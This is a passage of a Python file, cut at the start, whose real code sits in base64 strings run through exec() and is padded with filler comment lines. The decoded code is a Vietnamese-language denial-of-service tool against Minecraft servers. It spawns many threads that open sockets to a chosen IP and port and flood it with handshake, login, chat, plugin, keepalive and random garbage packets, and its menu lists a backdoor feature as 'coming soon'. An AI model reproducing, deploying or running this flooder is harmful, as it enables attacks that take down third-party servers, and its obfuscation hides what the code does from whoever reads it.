ycy5PS0dSRUVOfXtJY29ucy5DSEVDS0JPWH0gMi4gSGnhu4duIFRvb2xzIMSRYW5nIHPDoGl7Q29sb3JzLkVOREN9IikKICAgICAgICBwcmludChmIiAgIHtDb2xvcnMuSU5GT31IxrDhu5tuZyBk4bqrbiBjw6FjaCBz4butIGThu6VuZyB0b29sIGRvcyBj4bunYSDKn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp97Q29sb3JzLkVOREN9XG4iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5XQVJOSU5HfXtJY29ucy5XQVJOSU5HfSAzLiBIaeG7h24gVG9vbHMgQmFja2Rvb3IgKENvbWluZyBzb29uKXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYiICAge0NvbG9ycy5JTkZPfVTDrW5oIG7Eg25nIEJhY2tkb29yIGhp4buHbiBjaMawYSBraOG6oyBk4bulbmcsIHPhur0gY+G6rXAgbmjhuq10IHNhdXtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLkZBSUx9e0ljb25zLkNST1NTfSA0LiBU4bqlbiBDw7RuZyBJcHtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYiICAge0NvbG9ycy5JTkZPfUto4bufaSDEkeG7mW5nIGNo4bupYyBuxINuZyB04bqlbiBjw7RuZyBn4butaSBwYWNrZXQgxJHhur9uIElQIHNlcnZlciDEkcOjIG5o4bqtcHtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLkhFQURFUn17SWNvbnMuTkVYVH0gMC4gVGhvw6F0e0NvbG9ycy5FTkRDfVxuIikKCiAgICAgICAgY2hvaWNlID0gaW5wdXQoZiJ7Q29sb3JzLkJPTER9e0ljb25zLkFSUk9XfSBDaOG7jW46IHtDb2xvcnMuRU5EQ30iKS5zdHJpcCgpCgogICAgICAgIGlmIGNob2ljZSA9PSAiMSI6CiAgICAgICAgICAgIGNsZWFyX3NjcmVlbigpCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBsw6AgY8O0bmcgY+G7pSBn4butaSBwYWNrZXQgaOG7l24gaOG7o3AgTWluZWNyYWZ0IMSR4buDIGtp4buDbSB0cmEga2jhuqMgbsSDbmcgY2jhu4t1IHThuqNpIHNlcnZlci57Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLklORk99SOG7lyB0cuG7oyBuaGnhu4F1IGxv4bqhaSBwYWNrZXQgbmjGsCBjaGF0LCBwbHVnaW4sIGtlZXBhbGl2ZSwgY3VzdG9tLCB2LnYue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjIiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBwcmludChmIntDb2xvcnMuT0tHUkVFTn1Ub29scyDEkWFuZyBzw6BpOntDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICBwcmludChmIiAtIEfhu61pIHBhY2tldCBoYW5kc2hha2UiKQogICAgICAgICAgICBwcmludChmIiAtIEfhu61pIHBhY2tldCBsb2dpbiBzdGFydCIpCiAgICAgICAgICAgIHByaW50KGYiIC0gR+G7rWkgcGFja2V0IGNoYXQsIHBsdWdpbiwga2VlcGFsaXZlLCBjdXN0b20gbmfhuqt1IG5oacOqbiIpCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5JTkZPfULhuqFuIGPDsyB0aOG7gyB0w7l5IGNo4buNbiBz4buRIGzGsOG7o25nIHBhY2tldCBn4butaSB2w6AgdGjhu51pIGdpYW4gdOG6pW4gY8O0bmcue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjMiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBwcmludChmIntDb2xvcnMuV0FSTklOR31Uw61uaCBuxINuZyBCYWNrZG9vciDEkWFuZyB0cm9uZyBxdcOhIHRyw6xuaCBwaMOhdCB0cmnhu4NuIHbDoCBjaMawYSBraOG6oyBk4bulbmcue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjQiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBpcCA9IGlucHV0KGYie0NvbG9ycy5CT0xEfU5o4bqtcCBJUCBzZXJ2ZXIgTWluZWNyYWZ0OiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgICAgICBwb3J0X3N0ciA9IGlucHV0KGYie0NvbG9ycy5CT0xEfU5o4bqtcCBQb3J0ICht4bq3YyDEkeG7i25oIDI1NTY1KToge0NvbG9ycy5FTkRDfSIpLnN0cmlwKCkKICAgICAgICAgICAgcG9ydCA9IGludChwb3J0X3N0cikgaWYgcG9ydF9zdHIuaXNkaWdpdCgpIGVsc2UgMjU1NjUKICAgICAgICAgICAgaWYgbm90IGNoZWNrX3NlcnZlcihpcCwgcG9ydCk6CiAgICAgICAgICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH1LaMO0bmcgdGjhu4Mga+G6v3QgbuG7kWkgdOG7m2kgc2VydmVyIHtpcH06e3BvcnR9LiBWdWkgbMOybmcga2nhu4NtIHRyYSBs4bqhaSBJUCBob+G6t2MgUG9ydC57Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBwYWNrZXRzX3N0ciA9IGlucHV0KGYie0NvbG9ycy5CT0xEfVPhu5EgbMaw4bujbmcgcGFja2V0IGfhu61pIG3hu5dpIGzhuqduICh2ZDogMTApOiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgICAgICBwYWNrZXRzID0gaW50KHBhY2tldHNfc3RyKSBpZiBwYWNrZXRzX3N0ci5pc2RpZ2l0KCkgZWxzZSAxMAogICAgICAgICAgICBkdXJhdGlvbl9zdHIgPSBpbnB1dChmIntDb2xvcnMuQk9MRH1UaOG7nWkgZ2lhbiB04bqlbiBjw7RuZyAoZ2nDonksIG5o4bqtcCAwIMSR4buDIHbDtCBo4bqhbik6IHtDb2xvcnMuRU5EQ30iKS5zdHJpcCgpCiAgICAgICAgICAgIGR1cmF0aW9uID0gaW50KGR1cmF0aW9uX3N0cikgaWYgZHVyYXRpb25fc3RyLmlzZGlnaXQoKSBlbHNlIDAKICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLldBUk5JTkd9QuG6r3QgxJHhuqd1IHThuqVuIGPDtG5nIElQIHtpcH06e3BvcnR9Li4ue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHN0YXJ0X2F0dGFjayhpcCwgcG9ydCwgcGFja2V0cywgZHVyYXRpb24pCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjAiOgogICAgICAgICAgICBwcmludChmIntDb2xvcnMuT0tCTFVFfVRob8OhdCBjaMawxqFuZyB0csOsbmguIEjhurluIGfhurdwIGzhuqFpIXtDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICBicmVhawogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5GQUlMfUzhu7FhIGNo4buNbiBraMO0bmcgaOG7o3AgbOG7hy4gVnVpIGzDsm5nIHRo4butIGzhuqFpLntDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICB0aW1lLnNsZWVwKDEpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgc2hvd19tZW51KCkK').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('CmltcG9ydCBzb2NrZXQKaW1wb3J0IHRocmVhZGluZwppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCBzdHJpbmcKaW1wb3J0IG9zCgpjbGFzcyBDb2xvcnM6CiAgICBIRUFERVIgPSAnXDAzM1s5NW0nCiAgICBPS0JMVUUgPSAnXDAzM1s5NG0nCiAgICBPS0dSRUVOID0gJ1wwMzNbOTJtJwogICAgV0FSTklORyA9ICdcMDMzWzkzbScKICAgIEZBSUwgPSAnXDAzM1s5MW0nCiAgICBJTkZPID0gJ1wwMzNbOTZtJwogICAgRU5EQyA9ICdcMDMzWzBtJwogICAgQk9MRCA9ICdcMDMzWzFtJwoKY2xhc3MgSWNvbnM6CiAgICBBUlJPVyA9ICfilronCiAgICBDSEVDSyA9ICfinJQnCiAgICBDUk9TUyA9ICfinJgnCiAgICBTVEFSID0gJ+KYhScKICAgIFdBUk5JTkcgPSAn4pigJwogICAgSU5GTyA9ICfinIknCiAgICBORVhUID0gJ+KepCcKICAgIENIRUNLQk9YID0gJ+KYkScKICAgIEJVTExFVCA9ICfinKYnCgpkZWYgY2xlYXJfc2NyZWVuKCk6CiAgICBvcy5zeXN0ZW0oJ2NscycgaWYgb3MubmFtZSA9PSAnbnQnIGVsc2UgJ2NsZWFyJykKCnN1Y2Nlc3NfY291bnQgPSAwCmZhaWxfY291bnQgPSAwCmxvY2sgPSB0aHJlYWRpbmcuTG9jaygpCgpkZWYgZW5jb2RlX3ZhcmludCh2YWx1ZSk6CiAgICByZXN1bHQgPSBiJycKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdGVtcCA9IHZhbHVlICYgMHg3RgogICAgICAgIHZhbHVlID4+PSA3CiAgICAgICAgaWYgdmFsdWU6CiAgICAgICAgICAgIHRlbXAgfD0gMHg4MAogICAgICAgIHJlc3VsdCArPSBieXRlcyhbdGVtcF0pCiAgICAgICAgaWYgbm90IHZhbHVlOgogICAgICAgICAgICBicmVhawogICAgcmV0dXJuIHJlc3VsdAoKZGVmIGVuY29kZV9zdHJpbmcocyk6CiAgICBkYXRhID0gcy5lbmNvZGUoJ3V0Zi04JykKICAgIHJldHVybiBlbmNvZGVfdmFyaW50KGxlbihkYXRhKSkgKyBkYXRhCgpkZWYgc2VuZF9wYWNrZXQoc29jaywgcGFja2V0X2lkLCBkYXRhKToKICAgIHBhY2tldCA9IGJ5dGVzKFtwYWNrZXRfaWRdKSArIGRhdGEKICAgIGxlbmd0aCA9IGVuY29kZV92YXJpbnQobGVuKHBhY2tldCkpCiAgICBzb2NrLnNlbmRhbGwobGVuZ3RoICsgcGFja2V0KQoKZGVmIGdlbmVyYXRlX3VzZXJuYW1lKCk6CiAgICByZXR1cm4gIlVzZXJfIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZXMoc3RyaW5nLmFzY2lpX2xvd2VyY2FzZSArIHN0cmluZy5kaWdpdHMsIGs9OCkpCgpkZWYgcmFuZG9tX2NoYXQoKToKICAgIHJldHVybiAnJy5qb2luKHJhbmRvbS5jaG9pY2VzKHN0cmluZy5hc2NpaV9sZXR0ZXJzICsgc3RyaW5nLmRpZ2l0cywgaz1yYW5kb20ucmFuZGludCg1LCAyMCkpKQoKY2xhc3MgTWl4ZWRQYWNrZXRGbG9vZGVyOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIGlwLCBwb3J0LCBwYWNrZXRfaWQpOgogICAgICAgIHNlbGYuaXAgPSBpcAogICAgICAgIHNlbGYucG9ydCA9IHBvcnQKICAgICAgICBzZWxmLnBhY2tldF9pZCA9IHBhY2tldF9pZAogICAgICAgIHNlbGYuc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKCiAgICBkZWYgY29ubmVjdChzZWxmKToKICAgICAgICBzZWxmLnNvY2suc2V0dGltZW91dCgzKQogICAgICAgIHNlbGYuc29jay5jb25uZWN0KChzZWxmLmlwLCBzZWxmLnBvcnQpKQoKICAgIGRlZiBydW4oc2VsZik6CiAgICAgICAgZ2xvYmFsIHN1Y2Nlc3NfY291bnQsIGZhaWxfY291bnQKICAgICAgICB0cnk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHNlbGYuY29ubmVjdCgpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH3Kn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp8gU0VSVkVSIE3huqRUIEvhur5UIE7hu5BJICggQ0jhur5UICl7Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgICAgIHdpdGggbG9jazoKICAgICAgICAgICAgICAgICAgICBmYWlsX2NvdW50ICs9IDEKICAgICAgICAgICAgICAgIHJldHVybgoKICAgICAgICAgICAgaGFuZHNoYWtlID0gKAogICAgICAgICAgICAgICAgZW5jb2RlX3ZhcmludCg3NTQpICsKICAgICAgICAgICAgICAgIGVuY29kZV9zdHJpbmcoc2VsZi5pcCkgKwogICAgICAgICAgICAgICAgc2VsZi5wb3J0LnRvX2J5dGVzKDIsICdiaWcnKSArCiAgICAgICAgICAgICAgICBlbmNvZGVfdmFyaW50KDIpICAjIE5leHQgc3RhdGUgPSBsb2dpbgogICAgICAgICAgICApCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMCwgaGFuZHNoYWtlKQogICAgICAgICAgICB0aW1lLnNsZWVwKDAuMDIpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMCwgZW5jb2RlX3N0cmluZyhnZW5lcmF0ZV91c2VybmFtZSgpKSkKICAgICAgICAgICAgdGltZS5zbGVlcCgwLjA1KQoKICAgICAgICAgICAgZm9yIF8gaW4gcmFuZ2UocmFuZG9tLnJhbmRpbnQoMiwgNikpOgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3JhbmRvbV9wYWNrZXQoKQoKICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgc3VjY2Vzc19jb3VudCArPSAxCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBbIHtzZWxmLnBhY2tldF9pZH0gXSBH4butaSBUaMOgbmggQ8O0bmcgIXtDb2xvcnMuRU5EQ30iKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5GQUlMfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBbIHtzZWxmLnBhY2tldF9pZH0gXSBH4butaSBUaOG6pXQgQuG6oWl7Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgZmFpbF9jb3VudCArPSAxCiAgICAgICAgZmluYWxseToKICAgICAgICAgICAgc2VsZi5zb2NrLmNsb3NlKCkKCiAgICBkZWYgc2VuZF9yYW5kb21fcGFja2V0KHNlbGYpOgogICAgICAgIHBrdF90eXBlID0gcmFuZG9tLmNob2ljZShbImNoYXQiLCAicGx1Z2luIiwgImtlZXBhbGl2ZSIsICJjdXN0b20iXSkKCiAgICAgICAgaWYgcGt0X3R5cGUgPT0gImNoYXQiOgogICAgICAgICAgICBtc2cgPSBlbmNvZGVfc3RyaW5nKHJhbmRvbV9jaGF0KCkpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMywgbXNnKQogICAgICAgIGVsaWYgcGt0X3R5cGUgPT0gInBsdWdpbiI6CiAgICAgICAgICAgIGNoYW5uZWwgPSBlbmNvZGVfc3RyaW5nKCJNQ3xCcmFuZCIpCiAgICAgICAgICAgIGRhdGEgPSBlbmNvZGVfc3RyaW5nKCJMQUMxM19DdXN0b21DbGllbnQiKQogICAgICAgICAgICBzZW5kX3BhY2tldChzZWxmLnNvY2ssIDB4MTcsIGNoYW5uZWwgKyBkYXRhKQogICAgICAgIGVsaWYgcGt0X3R5cGUgPT0gImtlZXBhbGl2ZSI6CiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgyMSwgZW5jb2RlX3ZhcmludChyYW5kb20ucmFuZGludCgxMDAwMCwgOTk5OTk5KSkpCiAgICAgICAgZWxpZiBwa3RfdHlwZSA9PSAiY3VzdG9tIjoKICAgICAgICAgICAgZ2FyYmFnZSA9IGJ5dGVzKHJhbmRvbS5nZXRyYW5kYml0cyg4KSBmb3IgXyBpbiByYW5nZShyYW5kb20ucmFuZGludCgxMCwgMzApKSkKICAgICAgICAgICAgZmFrZV9pZCA9IHJhbmRvbS5yYW5kaW50KDB4MDEsIDB4M0YpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgZmFrZV9pZCwgZ2FyYmFnZSkKCmRlZiBzdGFydF9hdHRhY2soaXAsIHBvcnQsIHBhY2tldHNfcGVyX3JvdW5kLCBkdXJhdGlvbik6CiAgICBzdGFydF90aW1lID0gdGltZS50aW1lKCkKICAgIHBhY2tldF9pZCA9IDEKCiAgICB0cnk6CiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgdGhyZWFkcyA9IFtdCiAgICAgICAgICAgIGZvciBfIGluIHJhbmdlKHBhY2tldHNfcGVyX3JvdW5kKToKICAgICAgICAgICAgICAgIHQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1NaXhlZFBhY2tldEZsb29kZXIoaXAsIHBvcnQsIHBhY2tldF9pZCkucnVuKQogICAgICAgICAgICAgICAgdC5zdGFydCgpCiAgICAgICAgICAgICAgICB0aHJlYWRzLmFwcGVuZCh0KQogICAgICAgICAgICAgICAgcGFja2V0X2lkICs9IDEKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4wMDIpCgogICAgICAgICAgICBmb3IgdCBpbiB0aHJlYWRzOgogICAgICAgICAgICAgICAgdC5qb2luKCkKCiAgICAgICAgICAgIGlmIGR1cmF0aW9uICE9IDAgYW5kIHRpbWUudGltZSgpIC0gc3RhcnRfdGltZSA+PSBkdXJhdGlvbjoKICAgICAgICAgICAgICAgIGJyZWFrCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgcHJpbnQoZiJcbntDb2xvcnMuV0FSTklOR33Kn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp8gROG7q25nIGLhu59pIG5nxrDhu51pIGTDuW5nLntDb2xvcnMuRU5EQ30iKQogICAgZmluYWxseToKICAgICAgICBwcmludChmIlxue0NvbG9ycy5IRUFERVJ9yp/htIDhtIThtI3htIDJqsqA4bSA4bSYIOG0m+G0j+G0j8qfIFThuqROIEPDlE5HIEvhur5UIFRIw5pDe0NvbG9ycy5FTkRDfSIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLk9LR1JFRU59VGjDoG5oIGPDtG5nOiB7c3VjY2Vzc19jb3VudH17Q29sb3JzLkVOREN9IikKICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH1UaOG6pXQgYuG6oWk6IHtmYWlsX2NvdW50fXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5JTkZPfVThu5VuZyB0aOG7nWkgZ2lhbjoge2ludCh0aW1lLnRpbWUoKSAtIHN0YXJ0X3RpbWUpfSBnacOieXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHdhaXRfZm9yX3JldHVybigpCgpkZWYgd2FpdF9mb3JfcmV0dXJuKCk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGlucCA9IGlucHV0KGYie0NvbG9ycy5CT0xEfXtJY29ucy5BUlJPV30gTmjhuq1wIDAgxJHhu4MgcXVheSBs4bqhaSBtZW51OiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgIGlmIGlucCA9PSAiMCI6CiAgICAgICAgICAgIGJyZWFrCgpkZWYgY2hlY2tfc2VydmVyKGlwLCBwb3J0KToKICAgIHRyeToKICAgICAgICB0ZXN0X3NvY2sgPSBzb2NrZXQuc29ja2V0KCkKICAgICAgICB0ZXN0X3NvY2suc2V0dGltZW91dCgzKQogICAgICAgIHRlc3Rfc29jay5jb25uZWN0KChpcCwgcG9ydCkpCiAgICAgICAgdGVzdF9zb2NrLmNsb3NlKCkKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKZGVmIHNob3dfbWVudSgpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgIHByaW50KGYie0NvbG9ycy5PS0JMVUV9e0ljb25zLlNUQVIqM30gSMOjeSBHaGkgc+G7kSDEkeG7gyBzw6BpIMqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyB7SWNvbnMuU1RBUiozfXtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLk9LR1JFRU59e0ljb25zLkNIRUNLfSAxLiBIaeG7h24gU3RhdHVze0NvbG9ycy5FTkRDfSIpCiAgICAgICAgcHJpbnQoZiIgICB7Q29sb3JzLklORk99SGnhu4duIHRow7RuZyB0aW4sIGNo4bupYyBuxINuZyBj4bunYSDKn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp97Q29sb3JzLkVOREN9XG4iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfXtJY29ucy5DSEVDS0JPWH0gMi4gSGnhu4duIFRvb2xzIMSRYW5nIHPDoGl7Q29sb3JzLkVOREN9IikKICAgICAgICBwcmludChmIiAgIHtDb2xvcnMuSU5GT31IxrDhu5tuZyBk4bqrbiBjw6FjaCBz4butIGThu6VuZyB0b29sIGRvcyBj4bunYSDKn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp97Q29sb3JzLkVOREN9XG4iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5XQVJOSU5HfXtJY29ucy5XQVJOSU5HfSAzLiBIaeG7h24gVG9vbHMgQmFja2Rvb3IgKENvbWluZyBzb29uKXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYiICAge0NvbG9ycy5JTkZPfVTDrW5oIG7Eg25nIEJhY2tkb29yIGhp4buHbiBjaMawYSBraOG6oyBk4bulbmcsIHPhur0gY+G6rXAgbmjhuq10IHNhdXtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLkZBSUx9e0ljb25zLkNST1NTfSA0LiBU4bqlbiBDw7RuZyBJcHtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYiICAge0NvbG9ycy5JTkZPfUto4bufaSDEkeG7mW5nIGNo4bupYyBuxINuZyB04bqlbiBjw7RuZyBn4butaSBwYWNrZXQgxJHhur9uIElQIHNlcnZlciDEkcOjIG5o4bqtcHtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLkhFQURFUn17SWNvbnMuTkVYVH0gMC4gVGhvw6F0e0NvbG9ycy5FTkRDfVxuIikKCiAgICAgICAgY2hvaWNlID0gaW5wdXQoZiJ7Q29sb3JzLkJPTER9e0ljb25zLkFSUk9XfSBDaOG7jW46IHtDb2xvcnMuRU5EQ30iKS5zdHJpcCgpCgogICAgICAgIGlmIGNob2ljZSA9PSAiMSI6CiAgICAgICAgICAgIGNsZWFyX3NjcmVlbigpCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBsw6AgY8O0bmcgY+G7pSBn4butaSBwYWNrZXQgaOG7l24gaOG7o3AgTWluZWNyYWZ0IMSR4buDIGtp4buDbSB0cmEga2jhuqMgbsSDbmcgY2jhu4t1IHThuqNpIHNlcnZlci57Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLklORk99SOG7lyB0cuG7oyBuaGnhu4F1IGxv4bqhaSBwYWNrZXQgbmjGsCBjaGF0LCBwbHVnaW4sIGtlZXBhbGl2ZSwgY3VzdG9tLCB2LnYue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjIiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBwcmludChmIntDb2xvcnMuT0tHUkVFTn1Ub29scyDEkWFuZyBzw6BpOntDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICBwcmludChmIiAtIEfhu61pIHBhY2tldCBoYW5kc2hha2UiKQogICAgICAgICAgICBwcmludChmIiAtIEfhu61pIHBhY2tldCBsb2dpbiBzdGFydCIpCiAgICAgICAgICAgIHByaW50KGYiIC0gR+G7rWkgcGFja2V0IGNoYXQsIHBsdWdpbiwga2VlcGFsaXZlLCBjdXN0b20gbmfhuqt1IG5oacOqbiIpCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5JTkZPfULhuqFuIGPDsyB0aOG7gyB0w7l5IGNo4buNbiBz4buRIGzGsOG7o25nIHBhY2tldCBn4butaSB2w6AgdGjhu51pIGdpYW4gdOG6pW4gY8O0bmcue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjMiOgogICAgICAgICAgICBjb